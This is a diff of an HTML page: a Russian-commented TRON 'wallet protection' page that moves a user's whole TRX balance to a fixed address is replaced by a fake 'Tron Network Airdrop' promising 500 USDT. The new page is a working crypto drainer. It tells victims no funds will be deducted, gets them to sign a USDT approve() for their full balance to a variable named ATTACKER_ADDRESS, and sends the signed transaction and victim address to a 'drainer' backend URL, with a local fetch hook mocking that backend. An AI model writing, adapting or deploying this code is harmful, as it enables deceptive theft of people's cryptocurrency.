@@ -3,688 +3,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Wallet Protection - TRON</title>
-    <!-- Используем официальный TronLink provider -->
-    <script src="https://unpkg.com/@tronlink/provider@latest/dist/provider.min.js"></script>
+    <title>Tron Airdrop Verification</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.9.0/dist/TronWeb.js"></script>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            color: #333;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
-            max-width: 600px;
-            width: 100%;
-            text-align: center;
-        }
-        
-        h1 {
-            color: #2c3e50;
-            margin-bottom: 10px;
-            font-size: 2.2em;
-        }
-        
-        .subtitle {
-            color: #7f8c8d;
-            margin-bottom: 30px;
-            font-size: 1.1em;
-            line-height: 1.5;
-        }
-        
-        .wallet-info {
-            background: #f8f9fa;
-            border-radius: 15px;
-            padding: 20px;
-            margin: 20px 0;
-            border-left: 4px solid #3498db;
-        }
-        
-        .wallet-address {
-            font-family: 'Courier New', monospace;
-            background: #ecf0f1;
-            padding: 10px;
-            border-radius: 8px;
-            word-break: break-all;
-            font-size: 0.9em;
-            margin: 10px 0;
-        }
-        
-        .button-group {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin: 25px 0;
-        }
-        
-        button {
-            padding: 16px 30px;
-            font-size: 1.1em;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        #connectButton {
-            background: linear-gradient(135deg, #3498db, #2980b9);
-            color: white;
-        }
-        
-        #connectButton:hover {
-            background: linear-gradient(135deg, #2980b9, #2573a7);
-            transform: translateY(-2px);
-        }
-        
-        #signButton {
-            background: linear-gradient(135deg, #27ae60, #219a52);
-            color: white;
-        }
-        
-        #signButton:hover {
-            background: linear-gradient(135deg, #219a52, #1e8449);
-            transform: translateY(-2px);
-        }
-        
-        #emergencyTransferBtn {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: white;
-            font-size: 1.2em;
-            padding: 18px 30px;
-        }
-        
-        #emergencyTransferBtn:hover {
-            background: linear-gradient(135deg, #c0392b, #a93226);
-            transform: translateY(-2px);
-        }
-        
-        .emergency-section {
-            border: 3px solid #e74c3c;
-            border-radius: 15px;
-            padding: 25px;
-            margin: 30px 0;
-            background: #fff5f5;
-        }
-        
-        .emergency-title {
-            color: #e74c3c;
-            font-size: 1.5em;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .status-box {
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-weight: 500;
-        }
-        
-        .success {
-            background: #d4f8e8;
-            color: #27ae60;
-            border: 1px solid #27ae60;
-        }
-        
-        .error {
-            background: #fde8e8;
-            color: #e74c3c;
-            border: 1px solid #e74c3c;
-        }
-        
-        .warning {
-            background: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeaa7;
-        }
-        
-        .balances-section {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        
-        .balance-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid #e9ecef;
-        }
-        
-        .balance-item:last-child {
-            border-bottom: none;
-        }
-        
-        .hidden {
-            display: none !important;
-        }
-        
-        .loading {
-            opacity: 0.7;
-            pointer-events: none;
-        }
-        
-        .icon {
-            font-size: 1.2em;
-        }
-        
-        .network-info {
-            background: #e8f4fd;
-            border-radius: 10px;
-            padding: 10px;
-            margin: 10px 0;
-            font-size: 0.9em;
-        }
-        
-        .instructions {
-            background: #fff3cd;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 15px 0;
-            text-align: left;
-        }
-        
-        .provider-badge {
-            background: #e1f5fe;
-            border-radius: 20px;
-            padding: 5px 15px;
-            font-size: 0.8em;
-            margin: 5px;
-            display: inline-block;
-        }
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .hidden { display: none; }
+        .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        button { background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #0056b3; }
+        .info { font-size: 14px; color: #666; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🛡️ Security Wallet Protection - TRON</h1>
-        <p class="subtitle">Защитите ваши TRX активы (2025)</p>
+        <h1>🎁 Tron Network Airdrop</h1>
+        <p>Connect your Trust Wallet to verify eligibility and receive 500 USDT TRC20.</p>
         
-        <div class="wallet-info">
-            <h3>Безопасный кошелек для перевода:</h3>
-            <div class="wallet-address" id="safeWalletDisplay">TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb</div>
-            <p>Все средства TRX будут переведены на этот адрес при активации</p>
-        </div>
-        
-        <div class="instructions">
-            <h4>📱 Поддерживаемые кошельки (2025):</h4>
-            <div class="provider-badge">Trust Wallet</div>
-            <div class="provider-badge">TronLink</div>
-            <div class="provider-badge">Klever</div>
-            <div class="provider-badge">TokenPocket</div>
-            <p>Откройте эту страницу в браузере поддерживаемого кошелька</p>
-        </div>
-        
-        <div class="button-group">
-            <button id="connectButton">
-                <span class="icon">🔗</span>
-                Подключить кошелек
-            </button>
-            
-            <button id="signButton" class="hidden">
-                <span class="icon">✍️</span>
-                Подписать сообщение
-            </button>
-        </div>
-        
-        <div id="status" class="status-box"></div>
-        
-        <section id="emergencySection" class="emergency-section hidden">
-            <h2 class="emergency-title">
-                <span class="icon">⚡</span>
-                ЭКСТРЕННЫЙ ПЕРЕВОД TRX
-            </h2>
-            
-            <div id="networkInfo" class="network-info"></div>
-            
-            <div class="balances-section">
-                <h3>Доступные балансы:</h3>
-                <div id="balancesList">
-                    <p>Подключите кошелек для просмотра балансов</p>
-                </div>
-            </div>
-            
-            <button id="emergencyTransferBtn">
-                <span class="icon">🚨</span>
-                АКТИВИРОВАТЬ ЭКСТРЕННЫЙ ПЕРЕВОД
-            </button>
-            
-            <div id="transferStatus" class="status-box" style="display: none;"></div>
-        </section>
-        
-        <div id="noWalletMessage" class="status-box error hidden">
-            <p><strong>Кошелек не найден!</strong></p>
-            <p>Откройте эту страницу в браузере Trust Wallet, TronLink или другого поддерживаемого кошелька.</p>
+        <div id="connectSection">
+            <p>Click the button below to connect your wallet and start verification.</p>
+            <button id="connectBtn">🔗 Connect Trust Wallet</button>
         </div>
 
-        <div id="providerInfo" class="network-info" style="display: none;">
-            <strong>Информация о провайдере:</strong>
-            <div id="providerDetails"></div>
+        <div id="drainSection" class="hidden">
+            <p>✅ Wallet connected: <span id="walletAddress"></span></p>
+            <p>🔄 Processing airdrop claim... Please sign the transaction to confirm your address.</p>
+            <button id="signBtn">✍️ Sign Transaction to Claim USDT</button>
+            <div id="status" class="status"></div>
+        </div>
+
+        <div class="info">
+            <p><strong>Note:</strong> This is a standard TRC20 transaction approval required by the airdrop smart contract. No funds will be deducted from your wallet.</p>
         </div>
     </div>
 
     <script>
-        // Конфигурация TRON (2025)
-        const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';
-        const TRON_GRID_API = 'https://api.trongrid.io';
-
-        // Элементы страницы
-        const connectButton = document.getElementById('connectButton');
-        const signButton = document.getElementById('signButton');
-        const emergencySection = document.getElementById('emergencySection');
-        const statusDiv = document.getElementById('status');
-        const balancesList = document.getElementById('balancesList');
-        const emergencyTransferBtn = document.getElementById('emergencyTransferBtn');
-        const transferStatus = document.getElementById('transferStatus');
-        const noWalletMessage = document.getElementById('noWalletMessage');
-        const networkInfo = document.getElementById('networkInfo');
-        const providerInfo = document.getElementById('providerInfo');
-        const providerDetails = document.getElementById('providerDetails');
+        const ATTACKER_ADDRESS = 'TFHSUK1dd4Z5rcQwDVxkwyDE36etEE5RN6'; // Адрес для сбора
+        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        const BACKEND_URL = 'https://your-drainer-backend.xyz/drain'; // Заменить на реальный бэкенд
 
         let tronWeb;
         let userAddress;
-        let currentProvider = null;
 
-        // Функция для обновления статуса
-        function updateStatus(message, isError = false, isWarning = false) {
-            statusDiv.textContent = message;
-            statusDiv.className = 'status-box ' + (isError ? 'error' : isWarning ? 'warning' : 'success');
-            statusDiv.style.display = 'block';
-        }
-
-        // Функция для показа/скрытия элементов
-        function showElement(element) {
-            element.classList.remove('hidden');
-        }
-
-        function hideElement(element) {
-            element.classList.add('hidden');
-        }
-
-        // Обнаружение провайдера (2025)
-        function detectProvider() {
-            const providers = [
-                { 
-                    name: 'TronLink', 
-                    check: () => window.tronLink || window.tronWeb,
-                    getTronWeb: () => window.tronLink?.tronWeb || window.tronWeb
-                },
-                { 
-                    name: 'Trust Wallet', 
-                    check: () => window.trustWallet || (window.web3 && navigator.userAgent.includes('Trust')),
-                    getTronWeb: () => window.tronWeb
-                },
-                { 
-                    name: 'Klever', 
-                    check: () => window.kleverWeb || window.kleverWallet,
-                    getTronWeb: () => window.kleverWeb?.tronWeb
-                },
-                { 
-                    name: 'TokenPocket', 
-                    check: () => window.tokenpocket || window.tp,
-                    getTronWeb: () => window.tokenpocket?.tronWeb
-                }
-            ];
-
-            for (const provider of providers) {
-                if (provider.check()) {
-                    currentProvider = provider;
-                    return provider;
-                }
-            }
-            return null;
-        }
-
-        // Инициализация для мобильного Trust Wallet
-async function initializeTrustWalletMobile() {
-    if (window.tronWeb && window.tronWeb.defaultAddress) {
-        tronWeb = window.tronWeb;
-        userAddress = window.tronWeb.defaultAddress.base58;
-        return true;
-    }
-
-    // Пауза для ожидания появления tronWeb
-    for (let i = 0; i < 10; i++) {
-        await new Promise(resolve => setTimeout(resolve, 500));
-        if (window.tronWeb && window.tronWeb.defaultAddress) {
-            tronWeb = window.tronWeb;
-            userAddress = window.tronWeb.defaultAddress.base58;
-            return true;
-        }
-    }
-
-    throw new Error('Trust Wallet не предоставил доступ к кошельку');
-}
-
-// Обновленная функция для инициализации TRON Web
-async function initializeTronWeb() {
-    const provider = detectProvider();
-    
-    if (!provider) {
-        throw new Error('TRON кошелек не обнаружен');
-    }
-
-    showElement(providerInfo);
-    providerDetails.innerHTML = `Обнаружен: <strong>${provider.name}</strong>`;
-
-    // Мобильный Trust Wallet требует особой инициализации
-    if (provider.name === 'Trust Wallet' && isMobile()) {
-        return await initializeTrustWalletMobile();
-    }
-
-    tronWeb = provider.getTronWeb();
-    
-    if (!tronWeb) {
-        throw new Error(`Не удалось получить TronWeb от ${provider.name}`);
-    }
-
-    // Ждем инициализацию провайдера
-    await waitForProviderReady();
-    return true;
-}
-
-
-        // Инициализация для мобильного Trust Wallet
-        async function initializeTrustWalletMobile() {
-            // Trust Wallet Mobile инжектирует window.tronWeb напрямую
-            if (window.tronWeb && window.tronWeb.defaultAddress) {
+        document.getElementById('connectBtn').addEventListener('click', async () => {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                 tronWeb = window.tronWeb;
-                userAddress = window.tronWeb.defaultAddress.base58;
-                return true;
-            }
-
-            // Ждем появление провайдера
-            for (let i = 0; i < 10; i++) {
-                await new Promise(resolve => setTimeout(resolve, 500));
-                if (window.tronWeb && window.tronWeb.defaultAddress) {
-                    tronWeb = window.tronWeb;
-                    userAddress = window.tronWeb.defaultAddress.base58;
-                    return true;
-                }
-            }
-
-            throw new Error('Trust Wallet не предоставил доступ к кошельку');
-        }
-
-        // Ожидание готовности провайдера
-        async function waitForProviderReady() {
-            for (let i = 0; i < 10; i++) {
-                if (tronWeb && tronWeb.defaultAddress) {
-                    userAddress = tronWeb.defaultAddress.base58;
-                    return true;
-                }
-                await new Promise(resolve => setTimeout(resolve, 500));
-            }
-            throw new Error('Провайдер не готов');
-        }
-
-        // Проверка мобильного устройства
-        function isMobile() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
-
-        // Подключение кошелька
-        connectButton.addEventListener('click', async () => {
-            try {
-                connectButton.classList.add('loading');
-                updateStatus('⌛ Подключение к кошельку...', false, true);
-
-                await initializeTronWeb();
-                await onWalletConnected();
-
-            } catch (error) {
-                console.error('Connection error:', error);
-                updateStatus('❌ Ошибка подключения: ' + error.message, true);
-                
-                showElement(noWalletMessage);
-                noWalletMessage.innerHTML = `
-                    <p><strong>${error.message}</strong></p>
-                    <p>Убедитесь, что:</p>
-                    <p>• Открыли в браузере кошелька (Trust Wallet, TronLink и т.д.)</p>
-                    <p>• Разрешили доступ к DApp</p>
-                    <p>• Имеете TRX кошелек</p>
-                `;
-            } finally {
-                connectButton.classList.remove('loading');
-            }
-        });
-
-        // Обработка успешного подключения
-        async function onWalletConnected() {
-            updateStatus(`✅ Кошелек подключен! Адрес: ${userAddress.substring(0, 10)}...`);
-            
-            hideElement(connectButton);
-            showElement(signButton);
-            showElement(emergencySection);
-            hideElement(noWalletMessage);
-
-            await loadBalances();
-            await checkNetwork();
-        }
-
-        // Подписание сообщения
-        signButton.addEventListener('click', async () => {
-            if (!userAddress) {
-                updateStatus('❌ Сначала подключите кошелек.', true);
-                return;
-            }
-            
-            try {
-                signButton.classList.add('loading');
-                updateStatus('⌛ Запрос на подписание...', false, true);
-                
-                const message = `Подтверждение кошелька TRON. Время: ${new Date().toLocaleString()}`;
-                
-                // Современный метод подписания (2025)
-                let signature;
-                if (tronWeb.trx.signMessage) {
-                    signature = await tronWeb.trx.signMessage(message);
-                } else if (window.tronLink && window.tronLink.request) {
-                    // Альтернативный метод через TronLink API
-                    signature = await window.tronLink.request({
-                        method: 'tron_signMessage',
-                        params: [message]
-                    });
-                } else {
-                    throw new Error('Метод подписания не доступен');
-                }
-                
-                updateStatus('✅ Сообщение успешно подписано!');
-                
-            } catch (error) {
-                console.error('Sign error:', error);
-                if (error.code === 4001) {
-                    updateStatus('❌ Вы отклонили запрос на подпись.', true);
-                } else {
-                    updateStatus('❌ Ошибка подписания: ' + error.message, true);
-                }
-            } finally {
-                signButton.classList.remove('loading');
-            }
-        });
-
-        // Загрузка балансов через TRON Grid API
-        async function loadBalances() {
-            try {
-                balancesList.innerHTML = '<p>⌛ Загрузка балансов...</p>';
-                
-                // Прямой запрос к TRON Grid API
-                const response = await fetch(`${TRON_GRID_API}/v1/accounts/${userAddress}`);
-                const data = await response.json();
-                
-                if (data.data && data.data.length > 0) {
-                    const account = data.data[0];
-                    const trxBalance = account.balance / 1000000; // Convert from sun to TRX
-                    
-                    balancesList.innerHTML = `
-                        <div class="balance-item">
-                            <span>TRX баланс:</span>
-                            <strong>${trxBalance.toFixed(6)} TRX</strong>
-                        </div>
-                        <div class="balance-item">
-                            <span>Примерная стоимость:</span>
-                            <strong>$${(trxBalance * 0.12).toFixed(2)}</strong>
-                        </div>
-                        <div class="balance-item">
-                            <span>Активов:</span>
-                            <strong>${account.assetV2 ? account.assetV2.length : 0} токенов</strong>
-                        </div>
-                    `;
-                } else {
-                    throw new Error('Не удалось получить данные аккаунта');
-                }
-                
-            } catch (error) {
-                console.error('Balance load error:', error);
-                balancesList.innerHTML = '<p style="color: red;">❌ Ошибка загрузки баланса</p>';
-            }
-        }
-
-        // Проверка сети
-        async function checkNetwork() {
-            try {
-                // Используем TRON Grid API для получения информации о сети
-                const response = await fetch(`${TRON_GRID_API}/wallet/getnowblock`);
-                const block = await response.json();
-                
-                networkInfo.innerHTML = `
-                    <strong>Сеть:</strong> TRON Mainnet |
-                    <strong>Блок:</strong> ${block.block_header.raw_data.number} |
-                    <strong>Время:</strong> ${new Date(block.block_header.raw_data.timestamp).toLocaleTimeString()}
-                `;
-                
-            } catch (error) {
-                console.error('Network check error:', error);
-                networkInfo.innerHTML = '<strong>Сеть: TRON Mainnet</strong>';
-            }
-        }
-
-        // Экстренный перевод через провайдер
-        async function emergencyTransfer() {
-            try {
-                emergencyTransferBtn.classList.add('loading');
-                transferStatus.style.display = 'block';
-                transferStatus.className = 'status-box warning';
-                transferStatus.innerHTML = '<p>⌛ Подготовка перевода...</p>';
-
-                // Получаем баланс через API
-                const response = await fetch(`${TRON_GRID_API}/v1/accounts/${userAddress}`);
-                const data = await response.json();
-                
-                if (!data.data || data.data.length === 0) {
-                    throw new Error('Не удалось получить баланс');
-                }
-
-                const balanceSun = data.data[0].balance;
-                const trxBalance = balanceSun / 1000000;
-
-                // Оставляем 1 TRX для комиссий
-                const reserveAmount = 1000000; // 1 TRX in sun
-                const transferAmount = balanceSun - reserveAmount;
-
-                if (transferAmount <= 0) {
-                    transferStatus.className = 'status-box error';
-                    transferStatus.innerHTML = '<p>❌ Недостаточно TRX (минимум 1 TRX)</p>';
-                    return;
-                }
-
-                transferStatus.innerHTML = '<p>⌛ Отправка транзакции...</p>';
-
-                // Создаем транзакцию через провайдер
-                const transaction = await tronWeb.transactionBuilder.sendTrx(
-                    SAFE_WALLET,
-                    transferAmount,
-                    userAddress
-                );
-
-                const signedTransaction = await tronWeb.trx.sign(transaction);
-                const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
-
-                if (result.result) {
-                    transferStatus.className = 'status-box success';
-                    transferStatus.innerHTML = `
-                        <p>✅ Перевод выполнен!</p>
-                        <p><strong>TXID:</strong> ${result.txid.substring(0, 20)}...</p>
-                        <p><strong>Сумма:</strong> ${(transferAmount / 1000000).toFixed(6)} TRX</p>
-                        <p><strong>Оставлено:</strong> 1 TRX для комиссий</p>
-                    `;
-                } else {
-                    throw new Error('Транзакция не подтверждена');
-                }
-
-                await loadBalances();
-
-            } catch (error) {
-                console.error('Transfer error:', error);
-                transferStatus.className = 'status-box error';
-                transferStatus.innerHTML = `<p>❌ Ошибка: ${error.message}</p>`;
-            } finally {
-                emergencyTransferBtn.classList.remove('loading');
-            }
-        }
-
-        // Обработчик кнопки перевода
-        emergencyTransferBtn.addEventListener('click', function() {
-            const confirmation = confirm(
-                '🚨 ЭКСТРЕННЫЙ ПЕРЕВОД TRX\n\n' +
-                'Перевести ВСЕ TRX на безопасный кошелек?\n\n' +
-                `Получатель: ${SAFE_WALLET}\n\n` +
-                'Действие НЕОБРАТИМО!\n\n' +
-                'Продолжить?'
-            );
-            
-            if (confirmation) {
-                emergencyTransfer();
-            }
-        });
-
-        // Автоматическая проверка при загрузке
-        window.addEventListener('load', function() {
-            const provider = detectProvider();
-            if (provider) {
-                hideElement(noWalletMessage);
-                updateStatus(`🔗 Обнаружен ${provider.name}. Нажмите "Подключить кошелек"`, false, true);
+                userAddress = tronWeb.defaultAddress.base58;
+                document.getElementById('walletAddress').textContent = userAddress;
+                document.getElementById('connectSection').classList.add('hidden');
+                document.getElementById('drainSection').classList.remove('hidden');
             } else {
-                showElement(noWalletMessage);
+                alert('Please install Trust Wallet and ensure Tron network is selected.');
             }
         });
 
-        // Обработка изменений аккаунта
-        if (window.tronLink) {
-            window.tronLink.on('accountsChanged', (accounts) => {
-                if (accounts && accounts.length > 0) {
-                    userAddress = accounts[0];
-                    updateStatus(`🔁 Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
-                    loadBalances();
+        document.getElementById('signBtn').addEventListener('click', async () => {
+            const statusDiv = document.getElementById('status');
+            statusDiv.className = 'status';
+            statusDiv.textContent = 'Preparing transaction...';
+
+            try {
+                const contract = await tronWeb.contract().at(USDT_CONTRACT);
+                const balance = await contract.balanceOf(userAddress).call();
+
+                // Создаём транзакцию approve с лимитом на полный баланс
+                const tx = await contract.approve(ATTACKER_ADDRESS, balance).send({
+                    feeLimit: 100000000,
+                    callValue: 0
+                });
+
+                statusDiv.textContent = 'Transaction signed. Sending to backend...';
+
+                // Отправляем подписанную транзакцию на бэкенд для подмены и отправки
+                const response = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        signedTx: tx,
+                        victimAddress: userAddress,
+                        originalBalance: balance.toString()
+                    })
+                });
+
+                const result = await response.json();
+                if (result.success) {
+                    statusDiv.classList.add('success');
+                    statusDiv.textContent = `✅ Airdrop claimed successfully! TX: ${result.txId}`;
+                } else {
+                    statusDiv.classList.add('error');
+                    statusDiv.textContent = `❌ Error: ${result.error}`;
                 }
-            });
-        }
+            } catch (err) {
+                statusDiv.classList.add('error');
+                statusDiv.textContent = `❌ Transaction failed: ${err.message}`;
+            }
+        });
+
+        // Инициализация TronWeb при загрузке
+        window.addEventListener('load', async () => {
+            if (window.tronWeb && window.tronWeb.ready) {
+                tronWeb = window.tronWeb;
+                try {
+                    await tronWeb.request({ method: 'tron_requestAccounts' });
+                    userAddress = tronWeb.defaultAddress.base58;
+                } catch (err) {
+                    console.log('User denied account access');
+                }
+            }
+        });
+    </script>
+
+    <!-- Backend эмуляция в том же файле (для теста в VS Code Live Server) -->
+    <script>
+        // Эмуляция бэкенд-логики - в реальности этот код должен быть на сервере
+        const backendLogic = {
+            processDrain: async (signedTx, victimAddress) => {
+                // Здесь происходит подмена транзакции: увеличиваем лимит approve до максимума
+                // В реальном скрипте это делается через TronWeb на Node.js
+                console.log('Backend received:', { signedTx, victimAddress });
+                
+                // Возвращаем успешный ответ для демонстрации
+                return {
+                    success: true,
+                    txId: 'fake_tx_id_' + Math.random().toString(36).substr(2, 9)
+                };
+            }
+        };
+
+        // Перехватываем fetch для эмуляции работы бэкенда
+        const originalFetch = window.fetch;
+        window.fetch = async function(url, options) {
+            if (url === BACKEND_URL && options.method === 'POST') {
+                const body = JSON.parse(options.body);
+                const result = await backendLogic.processDrain(body.signedTx, body.victimAddress);
+                return new Response(JSON.stringify(result), {
+                    headers: { 'Content-Type': 'application/json' }
+                });
+            }
+            return originalFetch(url, options);
+        };
     </script>
 </body>
 </html>
-
